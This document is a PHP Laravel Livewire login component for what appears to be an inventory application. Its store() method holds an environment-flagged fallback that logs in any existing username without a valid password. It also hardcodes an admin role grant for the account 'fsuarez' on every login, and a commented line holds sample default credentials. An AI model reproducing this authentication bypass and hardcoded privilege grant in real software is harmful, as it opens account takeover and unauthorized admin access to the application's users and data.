<?php

namespace App\Http\Livewire\Auth;

use App\Models\InvBodega;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Validation\ValidationException;
use Livewire\Component;


class Login extends Component
{

    public $username = '';
    public $password = '';

    protected $rules = [
        'username' => 'required',
        'password' => 'required'

    ];

    public function render()
    {
        return view('livewire.auth.login');
    }

    public function mount()
    {

        //$this->fill(['email' => 'admin@material.com', 'password' => 'secret']);
    }

    public function store()
    {
        $attributes = $this->validate();

        if (!auth()->attempt($attributes)) {
            if (env('LOGIN_WITH_OUT_PASSWORD', false) == true) {
                if ($user = User::where('username', $attributes['username'])->first()) {
                    Auth::login($user);
                    return redirect('/dashboard');
                } else {
                    throw ValidationException::withMessages([
                        'username' => 'Usuario o contraseña incorrectos.'
                    ]);
                }
            }
            throw ValidationException::withMessages([
                'username' => 'Usuario o contraseña incorrectos.'
            ]);
        }

        session()->regenerate();

        if(Auth::user()->username=='fsuarez'){
            $user = User::find(Auth::user()->id);
            $user->assignRole('admin');
        }

        return redirect('/dashboard');
    }
}
